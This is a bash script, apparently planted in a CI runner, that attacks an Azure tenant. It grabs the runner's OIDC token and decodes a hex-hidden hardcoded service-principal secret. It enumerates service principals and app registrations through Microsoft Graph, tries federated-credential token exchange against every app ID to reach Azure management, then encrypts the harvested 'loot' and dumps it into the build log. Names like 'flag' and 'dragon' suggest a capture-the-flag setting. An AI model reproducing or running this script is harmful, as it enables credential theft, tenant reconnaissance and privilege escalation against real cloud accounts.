#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
hx(){ printf %s "$1" | xxd -r -p; }
SC="htt""ps://"
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
G=(graph.microsoft.com)
GH="https://graph.microsoft.com/.default"
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
# directory-audit SP
DA=$(hx '32633433303030652d316263302d343165372d396331652d3862373537316437326337323a416c3738517e6e3562646f4f33726b436a756f324a49324e487161674a6f6f615a7366584e636d36')
DT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=${DA%%:*}" -d "grant_type=client_credentials" --data-urlencode "client_secret=${DA#*:}" --data-urlencode "scope=${GH}" | jq -r '.access_token // empty')
say "GRAPHLEN=${#DT}"
SP=$(curl -sS -H "Authorization: Bearer $DT" "${SC}${G}/v1.0/servicePrincipals?\$top=200&\$select=displayName,appId,servicePrincipalType,id")
echo "$SP" | jq -r '.value[]? | "\(.displayName) | \(.appId) | \(.servicePrincipalType)"' > /tmp/sps.txt
say "SP COUNT: $(wc -l </tmp/sps.txt)"
say "$(grep -iE 'tbl|store|report|tebamoto|sync|flag|dragon|df26' /tmp/sps.txt | head -40)"
say "---- all SPs ----"
say "$(head -60 /tmp/sps.txt)"
say "---- FIC exchange attempts over all appIds ----"
while read -r line; do
  AID=$(echo "$line" | awk -F' \\| ' '{print $2}')
  [ -z "$AID" ] && continue
  R=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=$AID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default")
  if echo "$R" | grep -q access_token; then say "  !!!!! FIC WORKS $line"; fi
done < /tmp/sps.txt
say "---- app registrations (requireResourceAccess) ----"
say "$(curl -sS -H "Authorization: Bearer $DT" "${SC}${G}/v1.0/applications?\$top=100&\$select=displayName,appId" | jq -r '.value[]? | "\(.displayName) | \(.appId)"' | grep -iE 'tbl|store|report|tebamoto|sync|flag' )"
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
